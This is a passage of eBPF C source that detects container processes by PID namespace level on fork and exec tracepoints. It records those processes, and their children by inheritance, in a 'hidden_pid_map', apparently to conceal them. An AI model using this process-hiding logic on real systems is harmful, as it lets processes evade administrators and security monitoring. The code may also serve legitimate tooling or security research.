}

/* Enhanced container detection for current process */
static __always_inline bool is_current_process_in_container(void)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return false;

    /* Check PID namespace level */
    struct nsproxy *nsproxy = BPF_CORE_READ(task, nsproxy);
    if (!nsproxy)
        return false;

    struct pid_namespace *pid_ns = BPF_CORE_READ(nsproxy, pid_ns_for_children);
    if (!pid_ns)
        return false;

    u32 level = BPF_CORE_READ(pid_ns, level);

    /* Container processes typically have PID namespace level > 0 */
    if (level > 0) {
        return true;
    }

    /* Additional check: cgroup path contains container indicators */
    /* This requires userspace assistance for full implementation */
    return false;
}

/* Hook process fork events for proactive container detection */
SEC("tracepoint/sched/sched_process_fork")
int on_process_fork(struct trace_event_raw_sched_process_fork *ctx)
{
    u32 parent_pid = ctx->parent_pid;
    u32 child_pid = ctx->child_pid;

    /* Check if child process is a container process */
    if (is_container_process(child_pid)) {
        u32 val = 1;
        bpf_map_update_elem(&hidden_pid_map, &child_pid, &val, BPF_ANY);
        submit_event(99, child_pid); /* 99 = pid_hidden_update */
        submit_event(20, child_pid); /* 20 = container_auto_detected_fork */

        /* Log container detection details */
        bpf_printk("Auto-detected container process: PID %d (parent: %d)", child_pid, parent_pid);
    }

    /* Also check if parent is hidden, then hide child (inheritance) */
    if (is_hidden_pid(parent_pid)) {
        u32 val = 1;
        bpf_map_update_elem(&hidden_pid_map, &child_pid, &val, BPF_ANY);
        submit_event(99, child_pid); /* 99 = pid_hidden_update */
        submit_event(21, child_pid); /* 21 = child_inherited_hidden */

        bpf_printk("Child process inherited hidden status: PID %d (parent: %d)", child_pid, parent_pid);
    }

    return 0;
}



/* Hook process exec events for proactive container detection */
SEC("tracepoint/sched/sched_process_exec")
int on_process_exec(struct trace_event_raw_sched_process_exec *ctx)
{
    u32 pid = ctx->pid;

    /* Check if executing process is a container process */
    if (is_container_process(pid)) {
        u32 val = 1;
        bpf_map_update_elem(&hidden_pid_map, &pid, &val, BPF_ANY);
        submit_event(99, pid); /* 99 = pid_hidden_update */
        submit_event(22, pid); /* 22 = container_auto_detected_exec */

        /* Log container detection details */
        bpf_printk("Auto-detected container process on exec: PID %d", pid);
    }

    return 0;
}


